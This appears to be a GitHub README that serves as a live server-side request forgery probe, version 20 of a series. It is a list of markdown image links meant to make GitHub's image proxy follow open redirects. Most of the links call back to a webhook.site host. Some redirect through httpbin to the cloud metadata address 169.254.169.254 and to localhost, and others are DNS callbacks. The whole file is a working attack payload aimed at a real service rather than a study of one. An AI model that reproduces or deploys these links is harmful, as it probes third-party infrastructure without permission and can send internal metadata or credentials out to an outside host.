# SSRF Test v20 - Open Redirect Chains & GitHub-Specific Vectors

Testing GitHub-specific redirect endpoints and chained SSRF.

## Canary
![](https://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/v20-canary.gif)

## 1. GitHub Redirect Endpoints

### /settings/tokens redirect
![redir1](https://github.com/settings/tokens/new?redirect_uri=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/github-token-redir.gif)

### OAuth authorization redirect
![oauth1](https://github.com/login/oauth/authorize?client_id=test&redirect_uri=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/oauth.gif)

### Link redirector
![link1](https://github.com/link?redirect=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/link-redir.gif)

### Enterprise SSO callback
![sso1](https://github.com/orgs/test/saml/callback?redirect=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/sso.gif)

## 2. Raw Content Redirect

### Raw GitHub redirect
![raw1](https://github.com/jessi2000/progsjessi/raw/main/test.gif)
![raw2](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.gif)

### Objects redirect
![obj1](https://objects.githubusercontent.com/github-production-release-asset-2e65be/test.gif)

## 3. Camo Self-Reference

### Camo pointing to Camo (loop detection)
![camo1](https://camo.githubusercontent.com/test/test.gif)
![camo2](https://camo.githubusercontent.com/raw/test.gif)

### Camo to raw.githubusercontent
![camoraw](https://camo.githubusercontent.com/raw/webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/camo-raw.gif)

## 4. GitHub API Endpoints as Images

### API redirect tests
![api1](https://api.github.com/zen.gif)
![api2](https://api.github.com/octocat.gif)
![api3](https://api.github.com/user.gif)

### GraphQL endpoint  
![graphql](https://api.github.com/graphql.gif)

## 5. GitHub Actions Artifacts

### Artifact download redirect
![art1](https://github.com/jessi2000/progsjessi/actions/artifacts/download?name=test.gif)
![art2](https://github.com/jessi2000/progsjessi/suites/artifacts/test.gif)

## 6. GitHub Packages

### Container registry
![pkg1](https://ghcr.io/jessi2000/test/test.gif)
![pkg2](https://npm.pkg.github.com/jessi2000/test.gif)

## 7. External Redirect Services Through Camo

### Bitly/TinyURL style
![tiny1](http://tinyurl.com/create.php?url=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/tiny.gif)

### URL shorteners that redirect
![short1](http://httpbin.org/redirect-to?url=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/httpbin-redir.gif)
![short2](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
![short3](http://httpbin.org/redirect-to?url=http://127.0.0.1/test.gif)

### Multiple redirects
![multi1](http://httpbin.org/redirect/3?url=http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/multi-redir.gif)

## 8. DNS Callback Verification

![dns1](http://4ef122fd-20c5-45fc-bcc0-0c7bfe09a646.dnshook.site/v20-dns.gif)
![dns2](http://redirect-test.4ef122fd-20c5-45fc-bcc0-0c7bfe09a646.dnshook.site/redir.gif)

## 9. GitHub Enterprise Endpoints (if applicable)

### GHE metadata
![ghe1](https://github.localhost/meta.gif)
![ghe2](https://github-enterprise/api/v3/meta.gif)

## 10. Release Asset Redirect

### Release download redirect
![rel1](https://github.com/jessi2000/progsjessi/releases/download/v1/test.gif)
![rel2](https://github-releases.githubusercontent.com/test.gif)

## 11. Gist Raw Content

### Gist redirect
![gist1](https://gist.github.com/jessi2000/raw/test.gif)
![gist2](https://gist.githubusercontent.com/jessi2000/raw/test.gif)

## 12. Webhook Test

### External validation
![ext1](http://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/external-test.gif)
![ext2](https://webhook.site/4ef122fd-20c5-45fc-bcc0-0c7bfe09a646/https-test.gif)

Version 20 - Open Redirect Chain SSRF Testing